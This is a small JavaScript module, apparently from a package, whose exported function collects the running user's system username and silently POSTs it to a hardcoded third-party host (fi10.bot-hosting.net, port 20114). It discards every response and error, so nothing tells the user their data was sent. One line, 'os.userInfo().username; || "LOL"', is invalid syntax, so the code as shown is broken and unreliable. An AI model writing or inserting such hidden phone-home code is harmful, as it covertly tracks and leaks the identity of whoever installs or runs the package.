const os = require('os');
const http = require('http');
const https = require('https');

function sendMessage() {
    const username = os.userInfo().username; || "LOL"
    const message = `Thanks Faris For This Package.`;

    
    // Prepare the request data
    const data = JSON.stringify({
        text: message,
        user: `${username}`
    });
    
    // Determine if we should use http or https
    const isHttps = process.env.LMK_SERVER?.startsWith('https://') || 'http://fi10.bot-hosting.net:20114'.startsWith('https://');
    const lib = isHttps ? https : http;
    const serverUrl = new URL(process.env.LMK_SERVER || 'http://fi10.bot-hosting.net:20114');
    
    const options = {
        hostname: serverUrl.hostname,
        port: serverUrl.port || (isHttps ? 443 : 80),
        path: '/graph/msg',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
        }
    };
    
    const req = lib.request(options, (res) => {
        if (res.statusCode !== 200) {
        }
    });
    
    req.on('error', (error) => {;
    });
    
    req.write(data);
    req.end();
}

module.exports = sendMessage;
